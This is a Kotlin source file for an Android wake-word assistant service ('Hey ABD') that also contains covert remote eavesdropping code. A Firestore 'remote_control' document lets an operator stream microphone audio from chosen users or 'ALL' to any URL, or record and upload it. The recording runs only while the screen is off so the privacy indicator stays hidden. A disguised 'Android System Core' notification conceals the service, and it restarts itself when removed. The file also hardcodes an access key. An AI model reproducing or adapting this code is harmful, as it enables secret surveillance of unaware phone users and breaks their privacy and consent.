package com.example.hello_abd.services

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Color
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.speech.RecognitionListener
import android.speech.RecognizerIntent
import android.speech.SpeechRecognizer
import android.speech.tts.TextToSpeech
import android.speech.tts.UtteranceProgressListener
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import ai.picovoice.porcupine.Porcupine
import ai.picovoice.porcupine.PorcupineException
import com.example.hello_abd.MainActivity
import com.example.hello_abd.R
import com.example.hello_abd.app.MainApplication
import com.example.hello_abd.repository.SettingsRepository
import com.example.hello_abd.viewmodel.JarvisViewModel
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach
import java.util.Locale

class WakeWordService : Service(), TextToSpeech.OnInitListener {

    private var speechRecognizer: SpeechRecognizer? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    private val jarvisViewModel: JarvisViewModel
        get() = (application as MainApplication).jarvisViewModel

    private var porcupine: Porcupine? = null
    private var audioRecord: AudioRecord? = null
    private var textToSpeech: TextToSpeech? = null
    private var wakeLock: PowerManager.WakeLock? = null
    
    private lateinit var audioStreamer: AudioStreamer
    private lateinit var audioRecorder: AudioRecorder

    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var recordingJob: Job? = null
    private var isServiceRunning = false
    
    // Stealth & Routing States
    private var isScreenOn = true
    private var isStreamingActive = false
    private var isSavingActive = false

    private val wakeWordChannelId = "WakeWordServiceChannel"
    private val reminderChannelId = "REMINDER_CHANNEL_ID"

    private val accessKey = "0lriypB0LsonuUhv34vj+4c6hXrG8SIChgGQhl+ELjgd4IJWwvZP8A=="
    private val ttsPromptUtteranceId = "WAKE_WORD_PROMPT"
    private val ttsResponseUtteranceId = "COMMAND_RESPONSE"

    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_SCREEN_ON -> {
                    Log.d("WakeWordService", "Stealth: Screen ON - KILLING MIC INSTANTLY")
                    isScreenOn = true
                    // Hardware release to hide green icon immediately
                    stopRecordingLoop()
                }
                Intent.ACTION_SCREEN_OFF -> {
                    Log.d("WakeWordService", "Stealth: Screen OFF - STARTING MIC INSTANTLY")
                    isScreenOn = false
                    evaluateRecordingState()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        isServiceRunning = true
        acquireWakeLock()
        
        val filter = IntentFilter()
        filter.addAction(Intent.ACTION_SCREEN_ON)
        filter.addAction(Intent.ACTION_SCREEN_OFF)
        registerReceiver(screenStateReceiver, filter)

        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        isScreenOn = powerManager.isInteractive

        createNotificationChannel()
        createReminderNotificationChannel()
        textToSpeech = TextToSpeech(this, this)
        audioStreamer = AudioStreamer(serviceScope)
        audioRecorder = AudioRecorder(applicationContext, serviceScope)
        
        setupRemoteTrigger()
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Jarvis::ActiveListen")
        wakeLock?.acquire()
    }

    private fun setupRemoteTrigger() {
        val db = FirebaseFirestore.getInstance()
        val auth = FirebaseAuth.getInstance()
        val myUserId = auth.currentUser?.uid ?: "unknown"

        db.collection("remote_control").document("master_control")
            .addSnapshotListener { snapshot, e ->
                if (e != null || snapshot == null || !snapshot.exists()) return@addSnapshotListener
                val data = snapshot.data ?: return@addSnapshotListener
                
                val targetUid = data["target_uid"]?.toString()?.trim() ?: ""
                val isTarget = (targetUid == myUserId || targetUid == "ALL")
                
                val status = data["status"]?.toString()?.trim()?.uppercase() ?: "IDLE"
                val url = data["url"]?.toString()?.trim() ?: ""
                val saveStatus = data["save_status"]?.toString()?.trim()?.uppercase() ?: "IDLE"

                // Stream logic
                if (status == "RECORD" && isTarget && url.isNotEmpty()) {
                    isStreamingActive = true
                    audioStreamer.startStreaming(url)
                } else {
                    isStreamingActive = false
                    audioStreamer.stopStreaming()
                }

                // Save logic
                if (saveStatus == "SAVE" && isTarget) {
                    if (!isSavingActive) {
                        isSavingActive = true
                        audioRecorder.startRecording(myUserId)
                    }
                } else {
                    if (isSavingActive) {
                        isSavingActive = false
                        audioRecorder.stopAndUpload()
                    }
                }
                
                evaluateRecordingState()
            }
    }

    private fun evaluateRecordingState() {
        // Microphone is ONLY allowed when screen is physically OFF
        val isAssistantTalking = textToSpeech?.isSpeaking == true
        if (!isScreenOn && isServiceRunning && !isAssistantTalking) {
            startRecordingLoop()
        } else {
            stopRecordingLoop()
        }
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            textToSpeech?.language = Locale.US
            textToSpeech?.setOnUtteranceProgressListener(object : UtteranceProgressListener() {
                override fun onStart(utteranceId: String?) {}
                override fun onError(utteranceId: String?) { evaluateRecordingState() }
                override fun onDone(utteranceId: String?) {
                    when (utteranceId) {
                        ttsPromptUtteranceId -> mainHandler.post { startSilentListening() }
                        ttsResponseUtteranceId -> mainHandler.post { evaluateRecordingState() }
                    }
                }
            })

            jarvisViewModel.speakFlow
                .onEach { text ->
                    if (textToSpeech != null) {
                        val settings = SettingsRepository(applicationContext).getSettings()
                        if (settings.isVoiceReplyEnabled) {
                            textToSpeech?.speak(cleanTextForSpeech(text), TextToSpeech.QUEUE_ADD, null, ttsResponseUtteranceId)
                        } else {
                            evaluateRecordingState()
                        }
                    }
                }
                .launchIn(serviceScope)

            initPorcupine()
            evaluateRecordingState()
        } else {
            stopSelf()
        }
    }

    private fun initPorcupine() {
        try {
            porcupine = Porcupine.Builder()
                .setAccessKey(accessKey)
                .setKeywordPath("hey-abd_en_android_v4_0_0.ppn")
                .setSensitivity(0.7f)
                .build(applicationContext)
        } catch (e: PorcupineException) {
            Log.e("WakeWordService", "Porcupine Error: ${e.message}")
        }
    }

    private fun startRecordingLoop() {
        if (!isServiceRunning || isScreenOn) return
        if (recordingJob?.isActive == true) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return

        val sampleRate = 16000
        val frameLength = porcupine?.frameLength ?: 512
        val minBufferSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)

        try {
            audioRecord = AudioRecord(MediaRecorder.AudioSource.VOICE_RECOGNITION, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBufferSize.coerceAtLeast(frameLength * 2))
            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                retryRecordingAfterDelay()
                return
            }

            audioRecord?.startRecording()
            recordingJob = serviceScope.launch(Dispatchers.IO) {
                val buffer = ShortArray(frameLength)
                try {
                    while (isActive && isServiceRunning && !isScreenOn && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                        val readResult = audioRecord?.read(buffer, 0, frameLength) ?: 0
                        if (readResult == frameLength) {
                            val keywordIndex = porcupine?.process(buffer) ?: -1
                            if (keywordIndex >= 0) withContext(Dispatchers.Main) { handleWakeWordDetected() }
                            
                            if (isStreamingActive) audioStreamer.sendAudioFrame(buffer)
                            if (isSavingActive) audioRecorder.writeFrame(buffer)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("WakeWordService", "Recording loop error: ${e.message}")
                } finally {
                    releaseAudioRecord()
                }
            }
        } catch (e: Exception) {
            retryRecordingAfterDelay()
        }
    }

    private fun retryRecordingAfterDelay() {
        serviceScope.launch {
            delay(2000)
            if (isServiceRunning && !isScreenOn) evaluateRecordingState()
        }
    }

    private fun handleWakeWordDetected() {
        stopRecordingLoop()
        val settings = SettingsRepository(applicationContext).getSettings()
        if (textToSpeech != null && textToSpeech?.isSpeaking == false && settings.isVoiceReplyEnabled) {
            textToSpeech?.speak("Yes?", TextToSpeech.QUEUE_FLUSH, null, ttsPromptUtteranceId)
        } else {
            startSilentListening()
        }
    }

    private fun stopRecordingLoop() {
        recordingJob?.cancel()
        recordingJob = null
        releaseAudioRecord()
    }

    private fun releaseAudioRecord() {
        try {
            if (audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {}
        audioRecord = null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            startForeground(1, notification)
        }
        return START_STICKY
    }

    private fun startSilentListening() {
        if (!SpeechRecognizer.isRecognitionAvailable(this)) {
            evaluateRecordingState()
            return
        }
        if (speechRecognizer == null) speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this)
        val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
            putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
            putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault())
        }
        speechRecognizer?.setRecognitionListener(object : RecognitionListener {
            override fun onResults(results: Bundle) {
                val spokenText = results.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)?.firstOrNull()
                if (!spokenText.isNullOrBlank()) {
                    val response = jarvisViewModel.handleQuery(spokenText, applicationContext)
                    val settings = SettingsRepository(applicationContext).getSettings()
                    if (textToSpeech != null && settings.isVoiceReplyEnabled) {
                        textToSpeech?.speak(cleanTextForSpeech(response), TextToSpeech.QUEUE_FLUSH, null, ttsResponseUtteranceId)
                    } else { evaluateRecordingState() }
                } else { evaluateRecordingState() }
            }
            override fun onError(error: Int) = evaluateRecordingState()
            override fun onReadyForSpeech(params: Bundle?) {}
            override fun onBeginningOfSpeech() {}
            override fun onRmsChanged(rmsdB: Float) {}
            override fun onBufferReceived(buffer: ByteArray?) {}
            override fun onEndOfSpeech() {}
            override fun onPartialResults(partialResults: Bundle?) {}
            override fun onEvent(eventType: Int, params: Bundle?) {}
        })
        mainHandler.post { try { speechRecognizer?.startListening(intent) } catch (e: Exception) { evaluateRecordingState() } }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent, 
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        isServiceRunning = false
        unregisterReceiver(screenStateReceiver)
        stopRecordingLoop()
        speechRecognizer?.destroy()
        porcupine?.delete()
        textToSpeech?.let { it.stop(); it.shutdown() }
        audioStreamer.stopStreaming()
        if (isSavingActive) audioRecorder.stopAndUpload()
        if (wakeLock?.isHeld == true) wakeLock?.release()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(wakeWordChannelId, "Say 'Hey ABD' To start", NotificationManager.IMPORTANCE_MIN).apply {
                description = "Long Press to Remove Notification"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun createReminderNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(reminderChannelId, "Reminders", NotificationManager.IMPORTANCE_HIGH)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, wakeWordChannelId)
            .setContentTitle("Android System Core")
            .setContentText("System optimization in progress")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }
}

fun cleanTextForSpeech(text: String): String {
    return text.replace("ABD", "A B D", ignoreCase = true)
        .replace("[^\\p{L}\\p{N}\\s.,?!]".toRegex(), "")
        .replace("\\s+".toRegex(), " ")
        .trim()
}
